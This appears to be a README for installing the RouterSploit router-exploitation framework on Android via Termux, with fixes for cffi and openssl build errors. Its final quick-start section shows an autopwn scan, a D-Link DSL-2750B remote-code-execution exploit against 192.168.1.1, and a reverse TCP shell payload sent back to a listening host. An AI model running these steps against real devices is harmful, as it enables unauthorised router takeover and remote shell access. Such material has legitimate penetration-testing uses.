### Setup RouterSploit on Android 


<img src="https://github.com/desword/shellcode_tools/blob/master/img/android_sploit.jpg" width = 50% height = 50% div align=center />

* RouterSploit
	* RouterSploit is a Exploitation Framework for Embedded Devices
	* https://github.com/threat9/routersploit

* download termux
    * https://cn.apksum.com/down/com.termux_0.65_free
    * install python on termux
        * https://wiki.termux.com/wiki/Python
	* The default python of termux is python3, therefore it should work for routersploit.
	
* Basic install command
	* git clone https://www.github.com/threat9/routersploit
	* cd routersploit
	* pip install -r requirements.txt
* Errors when isntall routersploit on termux
    * errors of compiling cffi
		* [ref] https://github.com/termux/termux-packages/issues/1964
			* pkg install clang
		* if file "ffi.h" can not find,then 
			* apt search ffi 
			* apt install libffi libffi-dev
		* Then the cffi should be installed successfully.
	* errors of ,Issue installing cryptography (due to openssl built with no-engine) all about the openssl
		* [ref] https://github.com/termux/termux-packages/issues/2847
		* install the following old version of openssl, and it should work.
			* OpenSSL without no-engine config for AArch64: (in my test on HUAWEI MATE 8, the following packages should work)
				* openssl_1.1.1-2_aarch64.deb.gz
				* openssl-dev_1.1.1-2_aarch64.deb.gz
				* openssl-tool_1.1.1-2_aarch64.deb.gz
			* OpenSSL without no-engine config for arm:
				* openssl_1.1.1-2_arm.deb.gz
				* openssl-dev_1.1.1-2_arm.deb.gz
				* openssl-tool_1.1.1-2_arm.deb.gz
			* download 
				* using wget to download the above packages.
			* [CMD]
				* gunzip openssl_1.1.1-2_arm.deb.gz
				* gunzip openssl-dev_1.1.1-2_arm.deb.gz
				* gunzip openssl-tool_1.1.1-2_arm.deb.gz
				* dpkg -i openssl_1.1.1-2_arm.deb
				* dpkg -i openssl-dev_1.1.1-2_arm.deb
				* dpkg -i openssl-tool_1.1.1-2_arm.deb
	* Quick keyboards
		* using tab (volum +, and t)
		* show all keyboards (volum +, and q)
		* cursor left/right (volum +, and a/d) 
		* previous/latter commands (volum +, and w/s)
* quick start for RouterSploit
	* python rsf.py
	* use scanner/autopwn
	* set target 192.168.1.1
	* rsf (AutoPwn) > use exploits/routers/dlink/dsl_2750b_rce                                                        
	* rsf (D-Link DSL-2750B RCE) > set target 192.168.1.1                                                             
	* [+] target => 192.168.1.1                                                                                       
	* rsf (D-Link DSL-2750B RCE) > check                                                                              
	* [+] Target is vulnerable                                                                                        
	* rsf (D-Link DSL-2750B RCE) > run
	* cmd > show payloads
	* cmd > set payload reverse_tcp                                                                                   
	* cmd (MIPSBE Reverse TCP) > show options 
	* cmd (MIPSBE Reverse TCP) > set lhost 192.168.1.10
	* cmd (MIPSBE Reverse TCP) > run
	
		
			
			
			
